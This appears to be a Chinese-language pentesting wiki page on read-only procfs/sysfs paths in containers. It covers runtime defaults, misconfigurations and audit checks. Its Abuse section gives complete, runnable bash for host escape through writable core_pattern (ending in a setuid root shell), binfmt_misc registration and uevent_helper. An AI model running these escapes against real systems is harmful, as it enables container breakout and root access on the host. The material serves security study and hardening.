# 只读系统路径

{{#include ../../../../banners/hacktricks-training.md}}

只读系统路径是一种独立于 masked paths 的保护机制。运行时并不是完全隐藏路径，而是将其暴露出来但以只读方式挂载。这在选定的 procfs 和 sysfs 位置很常见：在这些位置，读取访问可能是可接受或在运行上必要，但写入则过于危险。

目的很直接：许多内核接口在可写时会变得更加危险。只读挂载并不会完全消除侦察价值，但它阻止了被入侵的工作负载通过该路径修改面向内核的底层文件。

## 工作原理

运行时通常将 proc/sys 视图的部分标记为只读。根据运行时和宿主机的不同，这可能包括如下路径：

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

实际的路径列表会有所不同，但模式相同：在需要时允许可见性，默认拒绝修改。

## 实验

检查 Docker 声明的只读路径列表：
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
在 container 内检查已挂载的 proc/sys 视图：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

只读的系统路径能缩小一大类影响宿主机的滥用途径。即使攻击者可以查看 procfs 或 sysfs，无法在其上写入会消除许多直接修改路径，这些路径涉及内核可调项、崩溃处理程序、模块加载辅助器或其他控制接口。暴露并未完全消失，但从信息泄露到对宿主机产生影响的跨越变得更难。

## Misconfigurations

主要错误包括将敏感路径解除屏蔽或重新挂载为读写、通过可写的 bind mounts 直接暴露宿主机的 proc/sys 内容，或使用实际上绕过更安全运行时默认设置的特权模式。在 Kubernetes 中，`procMount: Unmasked` 和特权工作负载常与较弱的 proc 保护同时出现。另一个常见的运维错误是假设因为运行时通常将这些路径挂载为只读，所有工作负载仍然会继承该默认设置。

## Abuse

如果保护薄弱，可先查找可写的 proc/sys 条目：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
当存在可写条目时，高价值的后续路径包括：
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
这些命令可能会揭示的内容：

- 位于 `/proc/sys` 下的可写条目通常意味着容器可以修改主机内核的行为，而不仅仅是查看它。
- `core_pattern` 特别重要，因为可写的面向主机的值可以在设置管道处理程序后，通过使进程崩溃被转为一个主机 code-execution 路径。
- `modprobe` 显示内核在模块加载相关流程中使用的 helper；当其可写时，它是一个经典的高价值目标。
- `binfmt_misc` 告诉你是否可以注册自定义解释器。如果注册是可写的，这可以变成一个 execution primitive，而不只是一个信息 leak。
- `panic_on_oom` 控制主机范围的内核决策，因此可以把资源耗尽转化为主机级的 denial of service。
- `uevent_helper` 是可写 sysfs helper 路径导致 host-context execution 的最明显示例之一。

有趣的发现包括那些本应只读但却可写的面向主机的 proc knobs 或 sysfs 条目。到那时，工作负载便从受限的容器视角转向了对内核的实质性影响。

### 完整示例： `core_pattern` 主机逃逸

如果 `/proc/sys/kernel/core_pattern` 从容器内部是可写的并指向主机内核视图，它可以被滥用在崩溃后执行 payload：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
如果路径确实到达宿主内核，payload 会在宿主上运行并留下一个 setuid shell。

### 完整示例： `binfmt_misc` 注册

如果 `/proc/sys/fs/binfmt_misc/register` 可写，注册自定义解释器可以在匹配的文件被执行时产生 code execution：
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
在面向宿主且可写的 `binfmt_misc` 上，会导致在内核触发的解释器路径中执行代码。

### 完整示例: `uevent_helper`

如果 `/sys/kernel/uevent_helper` 是可写的，内核在触发匹配事件时可能会调用宿主路径的辅助程序：
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
之所以如此危险，是因为辅助路径是从宿主机文件系统的视角解析的，而不是从安全的仅容器上下文解析。

## 检查

这些检查用于确定 procfs/sysfs 的暴露在预期位置是否为只读，以及工作负载是否仍然可以修改敏感的内核接口。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
What is interesting here:

- 一个正常加固的工作负载应该只暴露很少可写的 /proc/sys 条目。
- 可写的 `/proc/sys` 路径通常比普通的只读访问更重要。
- 如果运行时声明某路径为只读但实际上可写，应仔细检查 mount propagation、bind mounts 和特权设置。

## 运行时默认设置

| 运行时 / 平台 | 默认状态 | 默认行为 | 常见的手动削弱 |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | Docker 为敏感的 proc 条目定义了默认的只读路径列表 | 暴露主机 proc/sys 挂载， `--privileged` |
| Podman | 默认启用 | Podman 应用默认的只读路径，除非显式放宽 | `--security-opt unmask=ALL`、广泛的主机挂载、 `--privileged` |
| Kubernetes | 继承运行时默认设置 | 使用底层运行时的只读路径模型，除非被 Pod 设置或主机挂载削弱 | `procMount: Unmasked`、privileged workloads、可写的主机 proc/sys 挂载 |
| containerd / CRI-O under Kubernetes | 运行时默认 | 通常依赖 OCI/runtime 的默认设置 | 与 Kubernetes 行相同；直接更改运行时配置可以削弱该行为 |

关键点是，只读系统路径通常作为运行时默认存在，但它们很容易被特权模式或主机 bind 挂载所破坏。
{{#include ../../../../banners/hacktricks-training.md}}
